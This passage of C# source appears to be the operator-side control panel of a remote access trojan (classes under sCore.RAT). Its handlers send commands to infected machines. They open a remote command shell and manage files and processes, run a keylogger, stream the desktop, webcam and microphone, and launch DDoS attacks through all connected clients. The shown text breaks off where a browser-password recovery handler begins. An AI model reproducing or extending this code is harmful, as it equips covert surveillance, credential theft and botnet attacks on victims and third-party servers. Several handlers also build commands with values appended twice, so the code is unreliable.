        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button6_Click(object sender, EventArgs e)
        {
            string cmd = "t2s|" + richTextBox1.Text; //Construct the command
            SendToTarget(cmd); //Send to command to the client
        }

        /// <summary>
        /// Open the CD Tray on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button12_Click(object sender, EventArgs e)
        {
            const string cmd = "cd|open"; //Construct the command
            SendToTarget(cmd); //Send the command to the client
        }

        /// <summary>
        /// Close the CD Tray on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button13_Click(object sender, EventArgs e)
        {
            const string cmd = "cd|close"; //Construct the command
            SendToTarget(cmd); //Send the command to the client
        }

        /// <summary>
        /// Hide/show the clock on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button7_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender; //Get the sender control
            string cmd = ""; //Declare command variable

            if (c.Text.Contains("Visible")) //If it's visible
            {
                cmd = "emt|hide|clock"; //Construct the command
                c.Text = "Clock: Hidden"; //Update the button
            }
            else
            {
                cmd = "emt|show|clock"; //Contruct the command
                c.Text = "Clock: Visible"; //Update the button
            }

            SendToTarget(cmd); //Send the command to the client
        }

        /// <summary>
        /// Hide/show the task bar on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button8_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender; //Get the sender control
            string cmd = ""; //Declar the command

            if (c.Text.Contains("Visible")) //If it's visible
            {
                cmd = "emt|hide|task"; //Construct the command
                c.Text = "Task Bar: Hidden"; //Update the button
            }
            else
            {
                cmd = "emt|show|task"; //Construct the command
                c.Text = "Task Bar: Visible"; //Update the button
            }

            SendToTarget(cmd); //Send command to the client
        }

        /// <summary>
        /// Hide/show the desktop icons on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button9_Click(object sender, EventArgs e)
        {
            // TODO: extract code to separate function along with all elements related commands
            Control c = (Control)sender; //Get the sender control
            string cmd = ""; //Declare the command

            if (c.Text.Contains("Visible")) //If it's visible
            {
                cmd = "emt|hide|desktop"; //Construct the command
                c.Text = "Desktop Icons: Hidden"; //Update the button
            }
            else
            {
                cmd = "emt|show|desktop"; //Construct the command
                c.Text = "Desktop Icons: Visible"; //Update the button text
            }

            SendToTarget(cmd); //Send the command to the client
        }

        /// <summary>
        /// Hide/show the tray icons on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button10_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender; //Get the sender control
            string cmd = ""; //Declare the command

            if (c.Text.Contains("Visible")) //If it's visible
            {
                cmd = "emt|hide|tray"; //Construct the command
                c.Text = "Tray Icons: Hidden"; //Update the button
            }
            else
            {
                cmd = "emt|show|tray"; //Construct the command
                c.Text = "Tray Icons: Visible"; //Update the button
            }

            SendToTarget(cmd); //Send the command to the client
        }

        /// <summary>
        /// Hide/show the start menu on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button11_Click(object sender, EventArgs e)
        {
            Control c = (Control)sender; //Get the sender control
            string cmd = ""; //Declare the command

            if (c.Text.Contains("Visible")) //If it's visible
            {
                cmd = "emt|hide|start"; //Construct the command
                c.Text = "Start Menu: Hidden"; //Update the button
            }
            else
            {
                cmd = "emt|show|start"; //Construct the command
                c.Text = "Start Menu: Visible"; //Update the button
            }

            SendToTarget(cmd); //Send the command to the client
        }

        /// <summary>
        /// Refresh the process list
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void refreshToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            const string cmd = "proclist"; //Construct the command
            listView2.Items.Clear(); //Clear the process list
            SendToTarget(cmd); //Send the command to the client
        }

        /// <summary>
        /// Kill a process on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.SelectedItems.Count > 0) //If a process is selected
            {
                string id = listView2.SelectedItems[0].SubItems[1].Text; //get the process id
                string cmd = $"prockill|{id}"; //Construct the command

                SendToTarget(cmd); //Send the command to the client

                System.Threading.Thread.Sleep(1000); //Wait for the client to kill the process
                listView2.Items.Clear(); //Clear the process list
                SendToTarget("proclist"); //List the processes
            }
        }

        /// <summary>
        /// Start a new process on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button14_Click(object sender, EventArgs e)
        {
            if (textBox4.Text != "") //If process name isn't empty
            {
                string cmd = $"procstart|{textBox4.Text}|{comboBox4.SelectedItem.ToString()}"; //Construct the command

                SendToTarget(cmd); //Send the command to the client
                textBox4.Clear(); //Clear the process name box
                System.Threading.Thread.Sleep(1000); //Wait for the client to start the process
                listView2.Items.Clear(); //Clear the process list
                SendToTarget("proclist"); //List the processes
            }
        }

        /// <summary>
        /// Start/Stop remote command line
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button15_Click(object sender, EventArgs e)
        {
            if (!IsCmdStarted) //If it's stopped
            {
                const string command = "startcmd"; //Construct the command
                SendToTarget(command); //Send the command to the client
                IsCmdStarted = true; //Set the cmd started flag
                button15.Text = "Stop Cmd"; //Update the button
            }
            else
            {
                const string command = "stopcmd"; //Construct the command
                SendToTarget(command); //Send the command to the client
                IsCmdStarted = false; //Set the cmd started flag to false
                button15.Text = "Start Cmd"; //Update the button
            }
        }

        /// <summary>
        /// Handle remote command line input
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void textBox5_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Return && IsCmdStarted) //If remote cmd is started and eneter is pressed
            {
                string command = $"cmd§{textBox5.Text}"; //Construct the command
                textBox5.Text = ""; //Remove the text from the textBox
                if (command == "cmd§cls" || command == "cmd§clear") //Filter screen clear commands
                {
                    richTextBox2.Clear(); //Clear the screen locally
                }
                else if (command == "cmd§exit") //If we need to exit
                {
                    //Ask the user for exitting from remote terminal or sending the exit command or doing nothing
                    DialogResult result = MessageBox.Show(this, "Do you want to exit from the remote cmd?", "Warning", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Question);
                    if (result == DialogResult.Yes) //Stop the remote cmd
                    {
                        SendToTarget("stopcmd"); //Send command to the client
                        button15.Text = "Start Cmd"; //Update button
                        IsCmdStarted = false; //Set the cmd started flag to false
                    }
                }
                else SendToTarget(command); //Send the command to the client
            }
            else if (e.KeyCode == Keys.Return && !IsCmdStarted) //If eneter is pressed and remote cmd is not started
            {
                MessageBox.Show(this, "Cmd Thread is not started!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
            }
        }

        /// <summary>
        /// List the drives on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void listDrivesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            const string command = "fdrive"; //Construct the command
            SendToTarget(command); //Send the command to the client
        }

        /// <summary>
        /// Change the current directory
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void enterDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedIndices.Count > 0) //If and item is selected
            {
                string path = listView3.SelectedItems[0].Text;
                //if the item is not drive or a directory
                if ((path.Length != 3 && !path.EndsWith(":\\")) || listView3.SelectedItems[0].SubItems[1].Text != "Directory")
                {
                    MessageBox.Show(this, "The selected item is not a directory!", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
                    return; //Return
                }
                CurrentPath = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the directory or drive
                string command = $"fdir§{CurrentPath}"; //Construct the command
                SendToTarget(command); //Send the command to the client
                listView3.Items.Clear(); //Clear the file list
            }
            else
            {
                MessageBox.Show(this, "No directory is selected", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
            }
        }

        /// <summary>
        /// Travel to the parent directory
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (CurrentPath == "drive") //If we reached the top
            {
                MessageBox.Show(this, "Action cancelled!", "You are at the top of the file tree!", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
                return; //Return
            }
            string cmd = $"f1§{CurrentPath}"; //Construct the command
            SendToTarget(cmd); //Send the command to the client
        }

        /// <summary>
        /// Move a file on the remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void moveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0) //If an item is selected
            {
                xfer_path = listView3.SelectedItems[0].SubItems[3].Text; //Get the item's full path
                xfer_mode = xfer_move; //Store the transfer mode
            }
        }

        /// <summary>
        /// Copy a file on the remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0) //If an item is selected
            {
                xfer_path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full file path
                xfer_mode = xfer_copy; //Store the transfer mode
            }
        }

        /// <summary>
        /// Paste a file to the current directory on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void currentDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string cmd = $"fpaste§{CurrentPath}§{xfer_path}§{xfer_mode}"; //Construct the command
            SendToTarget(cmd); //Send the command
            RefreshFiles(); //Refresh the file list
        }

        /// <summary>
        /// Paste a file to the selected directory
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void selectedDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0) //If an item is selected
            {
                if (listView3.SelectedItems[0].SubItems[1].Text != "Directory") //If the items isn't the directory
                {
                    MessageBox.Show(this, "You can only paste a file into a directory", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Warning); //Notify the user
                    return; //Return
                }
                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the directory
                SendToTarget($"fpaste§{path}§{xfer_path}§{xfer_mode}" + path + "§" + xfer_path + "§" + xfer_mode); //Send the command to the client
                RefreshFiles(); //Refresh the file list
            }
        }

        /// <summary>
        /// Execute file on the remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void executeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0) //If an item is selected
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the files full path
                string command = $"fexec§{path}"; //Construct the command
                SendToTarget(command); //Send the command to the client
            }
        }

        /// <summary>
        /// Hide a file on the remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0) //If an item is selected
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
                string command = $"fhide§{path}"; //Contruct the command
                SendToTarget(command); //Send the command to the client
            }
        }

        /// <summary>
        /// Show a file on the remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void showToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0) //If an item is selected
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
                string command = $"fshow§{path}"; //Construct the command
                SendToTarget(command); //Send the command to the client
            }
        }

        /// <summary>
        /// Delete a file on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0) //If an item is selected
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
                string command = $"fdel§{path}" + path; //Construct the command
                SendToTarget(command); //Send the command to the client
                RefreshFiles(); //Refresh the file list
            }
        }

        /// <summary>
        /// Rename a file on the remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0) //If an item is selected
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the item
                string newName = ""; //Decalre the new name variable
                if (InputBox("Rename", "Please enter the new name of the file / directory!", ref newName) != DialogResult.OK) //Ask for the newName and if accepted
                {
                    return; // User denied to specify a new name
                }
                string cmd = $"frename§{path}§{newName}" + path + "§" + newName; //Construct the command
                SendToTarget(cmd); //Send the command to the client
                RefreshFiles(); //Refresh the file list
            }
        }

        /// <summary>
        /// Create a new file on the remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void fileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string name = ""; //Declare the file name
            if (InputBox("New File", "Please enter the name and extension for the new file!", ref name) != DialogResult.OK) //Ask for the new name and if accepted
            {
                return; // User cancelled the prompt
            }
            string command = $"ffile§{CurrentPath}§{name}"; //Construct the command
            SendToTarget(command); //Send the command to the client
            RefreshFiles(); //Refresh the file list
        }

        /// <summary>
        /// Create new directory on the remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void directoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string name = ""; //Declare directory name
            if (InputBox("New Directory", "Please enter the name for the new directory!", ref name) != DialogResult.OK) //Ask for the new name and if accepted
            {
                return; // User cancelled the operation
            }
            string command = $"fndir§{CurrentPath}§{name}"; //Construct the command
            SendToTarget(command); //Send the command to the client
            RefreshFiles(); //Refresh the file list
        }

        /// <summary>
        /// Edit file contents on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void editToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0) //if an item is selected
            {
                string path = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the item
                if (listView3.SelectedItems[0].SubItems[1].Text != "Directory") //If item isn't a directory
                {
                    return; // The user cancelled the operation
                }
                string cmd = $"getfile§{path}"; //Construct the command
                edit_content = path; //Store the path of the edited file
                SendToTarget(cmd); //Send the command to the client
            }
        }

        /// <summary>
        /// Upload file to current directory
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void currentDirectoryToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            string dir = CurrentPath; //Store the current path
            string file = ""; //Declatre the file name
            OpenFileDialog ofd = new OpenFileDialog(); //Create new file selector
            if (ofd.ShowDialog() == DialogResult.OK) file = ofd.FileName; //Get the selected file
            else return; // User didn't select a file to upload
            FileInfo fileInfo = new FileInfo(file);
            dir += "\\" + fileInfo.Name; //Construct the new file path
            string cmd = $"fup§{dir}§{fileInfo.Length}"; //Construct the command
            fup_local_path = file; //Store the local file path for uploading
            SendToTarget(cmd); //Send the command to the client
        }

        /// <summary>
        /// Upload file to the selected directory
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void selectedDirectoryToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0) //If an item is selected
            {
                string dir = listView3.SelectedItems[0].SubItems[3].Text; //Get the items full path
                string file = ""; //Declare file path
                OpenFileDialog ofd = new OpenFileDialog(); //Create new file selector
                if (ofd.ShowDialog() == DialogResult.OK) file = ofd.FileName; //Get the local file path
                else return; // User didn't select the file to save to
                FileInfo fileInfo = new FileInfo(file);
                dir += "\\" + fileInfo.Name; //Construct the remote file path
                string cmd = $"fup§{dir}§{fileInfo.Length}"; //Construct the command
                fup_local_path = file; //Set the local file path to upload
                SendToTarget(cmd); //Send the command to the client
            }
        }

        /// <summary>
        /// Download a file from a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView3.SelectedItems.Count > 0) //If an item is selected
            {
                if (listView3.SelectedItems[0].SubItems[1].Text == "Directory") return; //If user selected a directory return
                string remoteFile = listView3.SelectedItems[0].SubItems[3].Text; //Get the full path of the file
                string cmd = $"fdl§{remoteFile}"; //Construct the command
                SaveFileDialog sfd = new SaveFileDialog
                {
                    FileName = listView3.SelectedItems[0].SubItems[0].Text //Set the default file name
                }; //Create new file saver dialog
                if (sfd.ShowDialog() == DialogResult.OK) //If the user pressed save
                {
                    fdl_location = sfd.FileName; //Store the local location
                    SendToTarget(cmd); //Send the command to the client
                }
            }
        }

        /// <summary>
        /// Start a keylogger on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button16_Click(object sender, EventArgs e)
        {
            SendToTarget("sklog"); //Send the command to the client
        }

        /// <summary>
        /// Stop the keylogger on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button17_Click(object sender, EventArgs e)
        {
            SendToTarget("stklog"); //Stop the remote client
        }

        /// <summary>
        /// Read keylogs on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button18_Click(object sender, EventArgs e)
        {
            SendToTarget("rklog"); //Send the command to the client
        }

        /// <summary>
        /// Clear the keylogs on a remtoe client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button19_Click(object sender, EventArgs e)
        {
            SendToTarget("cklog"); //Send command to client
        }

        /// <summary>
        /// Start a remote desktop session on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void btnStartRemoteScreen_Click(object sender, EventArgs e)
        {
            btnCountScreens.Enabled = false; //Disable the screen counter button
            cmboChooseScreen.Enabled = false; //Disable the scrren chooser
            btnStartTaskManager.Enabled = true; //Enable the task manager opener button
            btnFullScreenMode.Enabled = true; //Enable full screen mode button
            trackBar1.Enabled = false; //Disable the FPS trackBar

            if (cmboChooseScreen.SelectedItem != null) //If a screen number is selected
            {
                SendToTarget($"screenNum{cmboChooseScreen.SelectedItem.ToString()}"); //Set the screen on the remote client
            }
            System.Threading.Thread.Sleep(1500); //Wait for the client
            MultiRecv = true; //Set multiRevc since this is a surveillance module
            RDesktop = true; //Enable the remote desktop flag
            SendToTarget("rdstart"); //Send the command to the client
        }

        /// <summary>
        /// Stop remote desktop session on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void btnStopRemoteScreen_Click(object sender, EventArgs e)
        {
            btnCountScreens.Enabled = true; //Enable screen counter button
            cmboChooseScreen.Enabled = true; //Enable screen selector
            trackBar1.Enabled = true; //Enable FPS trackBar
            btnStartTaskManager.Enabled = false; //Disable task manager opener button
            btnFullScreenMode.Enabled = false; //Disable full screen button

            SendToTarget("rdstop"); //Send command to the client
            Application.DoEvents(); //Do the events
            System.Threading.Thread.Sleep(2000); //Wait for the client to stop

            checkBoxrMouse.Checked = false; //Disable remote mouse
            checkBoxrKeyboard.Checked = false; //Disable remote keyboard

            RDesktop = false; //Disable the remote desktop flag
            MultiRecv = AuStream || WStream; // Set the multi recv flag
            IsRdFull = false; //Disable the full screen flag
            sCore.UI.CommonControls.remoteDesktopPictureBox = null; //Remove the full screen picture box reference from the plugins

            try
            {
                pictureBox1.Image.Dispose(); //Dispose the current frame
                pictureBox1.Image = null; //Remove image references
            }
            catch
            {
                //Do nothing
            }

            if (rmoveTimer != null) //If mouse moving timer is not null
            {
                rmoveTimer.Stop(); //Stop the timer
                rmoveTimer.Dispose(); //Dispose the timer
                rmoveTimer = null; //Remove the references from the timer
            }

            if (Rdxref == null) return; //if we don't have a reference to the full screen return
            Rdxref.Close(); //Close the full screen
            Rdxref.Dispose(); //Dispose the fullscreen
            Rdxref = null; //Remove References from the form
        }

        /// <summary>
        /// Handle registering remote desktop mouse positioning
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private async void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            if (mouseMovement == true) //if we can registre mouse events
            {

                Rectangle scr = Screen.PrimaryScreen.WorkingArea; //Get the screen size
                if (!IsRdFull) //If not full screen mode
                {
                    scr = pictureBox1.DisplayRectangle; //Get the picturebox's size
                }
                try
                {
                    int mx = (e.X * resx) / scr.Width; //Calculate remote MouseX coordinate
                    int my = (e.Y * resy) / scr.Height; //Calculate remote MouseY coordinate

                    if (rmouse == 1) //If we are allowed to move the mouse
                    {
                        if (plx != e.X || ply != e.Y) //Compare with the previous values and if mouse moved then
                        {
                            // TODO: post command from here, remove the timer
                            rMoveCommands.Add($"rmove-{mx}:{my}"); //Add mouse movement to the command list
                            plx = e.X; //Set the last X position to the current one
                            ply = e.Y; //Set the last Y position to the current one

                            mouseMovement = false; //Disable movement logging
                        }
                        //Wait for 200 ms
                        await Task.Delay(200); //this should stop the spammings of send commands -move the coursor very slowly and it will lockup so i added this
                        //Re enable mouse movement
                        mouseMovement = true; //and this switch ,cant send again for 200 ms - it works perfectly i am happy with it :-)
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("mouse move rd error ERROR = " + ex.Message); //Debug Function
                }
            }
        }

        /// <summary>
        /// Execute stored mouse events
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void RMoveTickEventHandler(object sender, EventArgs e)
        {
            if (rmouse == 1) //If we are allowed to move the mouse
            {
                if (rMoveCommands.Count > 0) //If we have stored events
                {
                    SendToTarget(rMoveCommands[rMoveCommands.Count - 1]); //Send the last stored event
                    rMoveCommands.Clear(); //Clear the event list
                }
            }
        }

        /// <summary>
        /// Enable/Disable remote mouse
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void checkBoxrMouse_CheckedChanged(object sender, EventArgs e)
        {
            sCore.RAT.RemoteDesktop.SetMouseControl(hostToken, checkBoxrMouse.Checked); //Notify the plugins of the event

            if (checkBoxrMouse.Checked) //If enabled
            {
                rmoveTimer = new Timer
                {
                    // rmoveTimer.Interval = 1000;
                    //Set the update rate to the frame update rate
                    Interval = FPS //now the mouse will move with the frame rate
                }; //Create a new timer
                rmoveTimer.Tick += new EventHandler(RMoveTickEventHandler); //Set the tick event handler
                rmoveTimer.Start(); //Start the timer
                rmouse = 1; //Allow mouse tracking
            }
            else //If disabled
            {
                rmouse = 0; //Disallow mouse tracking
                if (rmoveTimer != null) //if the timer is not null
                {
                    //Stop the timer
                    rmoveTimer.Stop(); //this threw an exception because it was already stopped
                    rmoveTimer.Dispose(); //Dispose the timer
                    rmoveTimer = null; //Remove timer references
                }
            }
        }

        /// <summary>
        /// Mosue Click Down Event Handler
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            if (rmouse == 1) //If remote mouse if enabled
            {
                if (e.Button == MouseButtons.Left) //If left button is clicked
                {
                    SendToTarget("rclick-left-down"); //Send command to client
                }
                else //Right button is clicked
                {
                    SendToTarget("rclick-right-down"); //Send command to client
                }
            }
        }

        /// <summary>
        /// Mouse Click Up Event Handler
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            // TODO: send the code of the click to avoid conversion at the client side
            if (rmouse == 1) //If remote mouse is enabled
            {
                if (e.Button == MouseButtons.Left) //If left button clicked
                {
                    SendToTarget("rclick-left-up"); //Send command to client
                }
                else //If right button clicked
                {
                    SendToTarget("rclick-right-up"); //Send command to client
                }
            }
        }

        /// <summary>
        /// Enable/Disable Remote keyboard
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void checkBoxrKeyboard_CheckedChanged(object sender, EventArgs e)
        {
            sCore.RAT.RemoteDesktop.SetKeyboardControl(hostToken, checkBoxrKeyboard.Checked); //Notify plugins of the event

            txtBControlKeyboard.Focus(); //Focus the textbox control

            if (checkBoxrKeyboard.Checked) //If enabled
            {
                rkeyboard = 1; //Allow remote keyboard
            }
        }

        /// <summary>
        /// Send the remote desktop session to full screen
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void btnFullRemoteScreen_Click(object sender, EventArgs e)
        {
            RDesktop full = new RDesktop(); //Create a new Remote Desktop Form
            full.Show(); //Show the form
            Rdxref = full; //Set the reference
            sCore.UI.CommonControls.remoteDesktopPictureBox = (PictureBox)full.Controls.Find("pictureBox1", true)[0]; //Set the remote desktop screen for plugins
            IsRdFull = true; //Set the full screen flag
        }

        /// <summary>
        /// List the installed audio devices on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button24_Click(object sender, EventArgs e)
        {
            SendToTarget("alist"); //Send the command to the client
        }

        /// <summary>
        /// Start/Stop audio stream on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button25_Click(object sender, EventArgs e)
        {
            if (listView4.SelectedItems.Count > 0) //If an item is selected
            {
                if (!AuStream) //If audio stream us not running
                {
                    int deviceNumber = listView4.SelectedItems[0].Index; //Get the channel of the device
                    MultiRecv = true; //Set the multiRecv flag since audio stream is a surveillance module
                    AuStream = true; //Set the audio stream flag
                    astream = new AudioStream(); //Create a new playback object
                    astream.Init(); //Init the playback object
                    SendToTarget("astream§" + deviceNumber.ToString()); //Send the command to the client
                    button25.Text = "Stop Stream"; //Update UI
                }
                else //If audio stream is running
                {
                    SendToTarget("astop"); //Send command to client
                    //if (!RDesktop && !WStream) //If no remote desktop or web cam stream is running
                    //{
                    //    Application.DoEvents(); //Do the events
                    //    System.Threading.Thread.Sleep(1500); //Wait for the client to stop streaming
                    //    MultiRecv = false; //Set multiRecv to false since no surveillance stream is running
                    //}
                    MultiRecv = WStream || RDesktop; // Set the multiRecv flag
                    AuStream = false; //Disable the audioStream flag
                    astream.Destroy(); //Destroy the playback object
                    astream = null; //Remvove references to the playback object
                    button25.Text = "Start Stream"; //Update the UI
                }
            }
        }

        /// <summary>
        /// List web cam devices on a remote client
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button26_Click(object sender, EventArgs e)
        {
            SendToTarget("wlist"); //Send the command to the client
        }

        /// <summary>
        /// Start/Stop streaming the web cam
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button27_Click(object sender, EventArgs e)
        {
            if (!WStream && listView5.SelectedItems.Count > 0) //If an item is selected and web cam is not streaming
            {
                string id = listView5.SelectedItems[0].SubItems[0].Text; //Get the ID of the device
                string command = $"wstream§{id}"; //Construct the command
                MultiRecv = true; //Set the multiRecv flag since web cam is a surveillance stream
                WStream = true; //Set the web cam stream flag
                button27.Text = "Stop stream"; //Update the UI
                SendToTarget(command); //Send the command to the client
                return; //Return
            }
            else if (WStream) //If web cam is streaming
            {
                SendToTarget("wstop"); //Send the command to the client

                //if (!RDesktop && !AuStream) //If remote desktop and audio stream isn't running
                //{
                //    Application.DoEvents(); //Do the events
                //    System.Threading.Thread.Sleep(1500); //Wait for the client to stop the stream
                //    MultiRecv = false; //Disable the multiRecv flag since no surveillance stream is running
                //}
                MultiRecv = RDesktop || AuStream;
                WStream = false; //Disable the web cam stream flag
                button27.Text = "Start Stream"; //Update the UI
            }
        }

        /// <summary>
        /// Test if DDoS attack will will reach the target
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button29_Click(object sender, EventArgs e)
        {
            if (textBox6.Text == "" || comboBox5.SelectedItem == null) return; //If no IP or no protocol is set then return

            TestDDoS(textBox6.Text, comboBox5.SelectedItem.ToString()); //Test the DDoS target
        }

        /// <summary>
        /// Start a DDoS attack against a remote server
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button28_Click(object sender, EventArgs e)
        {
            bool isAllClient = checkBox3.Checked; //Attack with all connected clients?
            string ip = textBox6.Text; //The IP of the target
            string port = numericUpDown1.Value.ToString(); //The port to attack on
            string protocol = comboBox5.SelectedItem.ToString(); //The protocol to use
            string packetSize = numericUpDown2.Value.ToString(); //The size of each packet sent
            string threads = numericUpDown3.Value.ToString(); //How many threads to use per client
            string delay = numericUpDown4.Value.ToString(); //How much to wait before sending the next packet
            StartDDoS(ip, port, protocol, packetSize, threads, delay, isAllClient); //Start the Attack
        }

        /// <summary>
        /// Stop a started DDoS attack
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button30_Click(object sender, EventArgs e)
        {
            const string command = "ddosk"; //Construct the command
            int count = 0; //Declare index variable
            foreach (Socket s in _clientSockets) //Go through all connected clients
            {
                SendCommand(command, count); //Send the command to the client
                count++; //Increment the index
            }
            label18.Text = "Status: DDoS Stopped for all clients!"; //Update the UI
        }

        /// <summary>
        /// Clear the password recovery list
        /// </summary>
        /// <param name="sender">The sender of the event</param>
        /// <param name="e">The event args</param>
        private void button32_Click(object sender, EventArgs e)
        {
            listView6.Clear(); //Clear the list
        }

        /// <summary>
        /// Recover browser passwords on the remote client
